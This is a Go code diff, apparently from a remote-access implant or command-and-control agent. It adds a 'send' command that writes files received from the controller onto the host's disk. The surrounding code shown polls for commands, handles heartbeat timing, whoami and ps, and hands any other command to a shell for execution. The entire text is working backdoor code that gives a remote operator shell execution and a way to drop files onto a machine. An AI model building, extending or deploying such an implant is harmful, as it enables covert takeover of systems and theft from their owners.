@@ -51,7 +51,7 @@ func main() {
 
 		if messageContainsCommands(message) {
 			for index, command := range message.Commands {
-				message.Commands[index].Response = executeCommand(command.Command)
+				message.Commands[index].Response = executeCommand(command.Command, index)
 			}
 		}
 		time.Sleep(time.Duration(waitTime) * time.Second)
@@ -60,7 +60,7 @@ func main() {
 
 }
 
-func executeCommand(command string) (response string) {
+func executeCommand(command string, index int) (response string) {
 	// Separate the command and the arguments
 	// htb -> modify the wait time
 	// htb 10 -> modify the wait time to 10 seconds
@@ -84,10 +84,22 @@ func executeCommand(command string) (response string) {
 		response = whoAmI()
 	case "ps":
 		response = listProcesses()
+	case "send":
+		response = saveFileToDisk(message.Commands[index].File)
 	default:
 		response = executeCommandOnShell(command)
 	}
 
+	return response
+}
+
+func saveFileToDisk(file structures.File) (response string) {
+	err := os.WriteFile(file.FileName, file.FileData, 0644)
+	if err != nil {
+		response = "Error saving file to disk"
+	} else {
+		response = "File saved to disk"
+	}
 	return response
 }
 
